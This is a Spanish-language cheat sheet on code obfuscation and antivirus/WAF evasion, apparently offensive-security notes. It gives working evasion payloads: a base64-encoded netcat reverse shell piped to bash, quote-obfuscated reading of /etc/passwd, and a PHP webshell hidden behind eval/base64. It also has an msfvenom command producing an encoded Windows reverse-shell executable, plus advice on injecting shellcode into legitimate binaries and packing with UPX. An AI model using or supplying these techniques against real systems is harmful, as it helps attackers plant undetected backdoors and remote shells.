---
title: Ofuscación y Evasión de Defensas
pubDate: 2026-05-22
---

## ¿Qué es la Ofuscación?
La **ofuscación** es el arte de transformar el código para que sea difícil de entender por humanos y programas de seguridad (antivirus/EDR), manteniendo su funcionalidad original. La **evasión** se refiere al uso de estas y otras técnicas para saltar protecciones activas.

### Propósito táctico
1.  **Saltar Antivirus (AV):** Modificar la firma del malware para que no sea detectado.
2.  **Dificultar la Ingeniería Inversa:** Hacer que el análisis del código sea frustrante y lento.
3.  **Bypass de Firewalls (WAF):** Ofuscar payloads web (ej: SQLi o XSS) para que el firewall no los reconozca.

---

## 🐚 1. Ofuscación de Comandos (Linux/Bash)
Evita que sistemas de monitoreo detecten palabras clave como `cat` o `nc`.

```bash
# Invertir el comando
$(echo "di" | rev)       # Ejecuta 'id'

# Usar variables vacías
c""at /et''c/pas""swd    # Ejecuta 'cat /etc/passwd'

# Uso de Base64
echo "bmMgLWUvaW4vc2ggMTAuMTAuMTAuMTAgNDQ0NA==" | base64 -d | bash
```

---

## 🐘 2. Ofuscación en Web (PHP)
Muy útil para ocultar webshells.

```php
# Ejecución mediante eval y Base64
eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); 

# Uso de funciones variables
$a = "sys"."tem";
$a("id");
```

---

## 🛡️ 3. Evasión de Antivirus (Windows)
Los antivirus detectan patrones conocidos (firmas). Cambiar el archivo sin cambiar su función es la clave.

### Msfvenom con Encoders
Intenta mutar el shellcode para que no coincida con firmas conocidas.
```bash
# -e: encoder, -i: iteraciones (cuantas veces se aplica)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -e x64/shikata_ga_nai -i 10 -f exe > shell_ofuscado.exe
```

### Herramientas de Inyección y Empaquetado
*   **Shellter:** Inyecta código malicioso (shellcode) dentro de un ejecutable legítimo (ej: `winrar.exe`). Es muy efectivo contra AVs básicos.
*   **UPX:** Empaquetador de archivos que comprime el binario, cambiando su firma.
    ```bash
    upx -9 archivo.exe
    ```

---

## 🏃 4. Living Off The Land (LOLBAS)
La mejor forma de evadir es no usar malware. Usa herramientas legítimas de Windows/Linux para tus fines:
*   **Linux:** Consulta [GTFOBins](https://gtfobins.github.io/) para usar `find`, `vim` o `awk` para obtener shells.
*   **Windows:** Consulta [LOLBAS](https://lolbas-project.github.io/) para usar `certutil`, `powershell` o `bitsadmin` para descargar archivos.

> **Tip:** Hoy en día, los encoders simples de Msfvenom suelen ser detectados. Lo más efectivo es programar tus propios **wrappers en C# o Python** que carguen el shellcode directamente en memoria (Process Injection).
